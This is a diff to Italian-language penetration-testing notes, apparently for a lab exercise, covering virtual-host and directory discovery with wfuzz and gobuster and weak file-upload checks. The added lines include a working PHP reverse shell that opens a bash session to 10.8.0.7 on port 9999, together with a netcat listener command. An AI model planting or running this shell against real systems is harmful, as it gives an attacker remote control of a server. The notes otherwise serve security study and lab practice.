@@ -352,9 +352,9 @@ cartelle utilissime per trovare cose nascoste o altro
 - `/robots.txt`
 - `/sitemap.xml`
 - trovare i virtual host che nascondono gli host che hanno 4829 linee
-	- `wfuzz -w ./subdomains-top1million-5000.txt -u http://192.168.14.132 -H "HOST: FUZZ.cloud.vdsi" --hh 4829`
+	- `wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://192.168.14.27  -H "HOST: FUZZ.muntrea-energy.vdsi" --hh 1950
 		- `gobuster vhost -u http://vdsi-services.xyz/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
-		- `-k` per ignorare
+		- `-k` per ignorare i certificati https
 - trovare i web content delle cartelle
 	- `gobuster dir -u http://cloud.vdsi --proxy http://127.0.0.1:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 4829`
 	- `gobuster dir -u http://admin.cloud.vdsi  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 0 -x php`
@@ -412,3 +412,10 @@ Poi, se il log viene incluso da una LFI, potresti eseguire comandi tipo:
 anche se il file in realtà è PHP.
 - Serve per provare a bypassare controlli deboli sull’upload.
 - Però un controllo serio verifica anche estensione, contenuto reale del file e configurazione del server.
+```php
+<?php
+$s=fsockopen("10.8.0.7",9999);
+proc_open("/bin/bash",[$s,$s,$s],$p);
+?>
+```
+`nc 9999 -lvnp`
